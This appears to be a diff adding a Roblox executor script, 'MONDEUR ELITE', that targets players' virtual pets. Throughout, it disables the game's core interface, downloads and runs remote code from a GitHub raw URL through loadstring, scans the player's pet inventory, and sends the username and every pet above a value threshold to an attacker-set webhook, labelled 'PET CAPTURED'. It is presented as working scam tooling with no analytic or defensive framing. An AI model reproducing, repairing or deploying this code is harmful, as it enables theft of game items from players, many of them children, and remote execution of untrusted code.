@@ -1,0 +1,72 @@
+-- [[ MONDEUR ELITE v16.6 - STABILIZED ]] --
+if getgenv().Executed then return end
+getgenv().Executed = true
+
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local HttpService = game:GetService("HttpService")
+local StarterGui = game:GetService("StarterGui")
+local LocalPlayer = Players.LocalPlayer
+
+-- 1. FORCE UI & LOCKDOWN (High Priority)
+task.spawn(function()
+    pcall(function()
+        -- Instant Lockdown
+        StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
+        
+        -- Load Screen
+        local uiCode = game:HttpGet("https://raw.githubusercontent.com/charles1384/ADM/main/V.1")
+        if uiCode then
+            loadstring(uiCode)()
+        end
+    end)
+end)
+
+-- 2. ROBUST WEBHOOK HANDLER
+local function SendLog(title, pet, val)
+    local payload = HttpService:JSONEncode({
+        ["embeds"] = {{
+            ["title"] = title,
+            ["description"] = "User: " .. LocalPlayer.Name,
+            ["fields"] = {
+                {["name"] = "Pet", ["value"] = pet, ["inline"] = true},
+                {["name"] = "Value", ["value"] = tostring(val), ["inline"] = true}
+            },
+            ["color"] = 0x00FF00
+        }}
+    })
+
+    local req = (syn and syn.request) or (http and http.request) or http_request or request
+    if req then
+        task.spawn(function()
+            pcall(function()
+                req({
+                    Url = getgenv().WEBHOOK,
+                    Method = "POST",
+                    Headers = {["Content-Type"] = "application/json"},
+                    Body = payload
+                })
+            end)
+        end)
+    end
+end
+
+-- 3. CONTROLLED SCAN (No Spam)
+task.spawn(function()
+    task.wait(2) -- Wait for game to settle
+    SendLog("📡 CONNECTION TEST", "Success", 0)
+
+    local ClientData = require(ReplicatedStorage.ClientModules.Core.ClientData)
+    local data = ClientData.get_data()
+    
+    local petPath = data.inventory and (data.inventory.inventory_pets or data.inventory.pets)
+    
+    if petPath then
+        for _, pet in pairs(petPath) do
+            local val = _G.GetTrueValue(pet, _G.PetValueDB) or 0
+            if val >= (getgenv().THRESHOLD or 0) then
+                SendLog("✅ PET CAPTURED", pet.config_name or "Unknown", val)
+            end
+        end
+    end
+end)
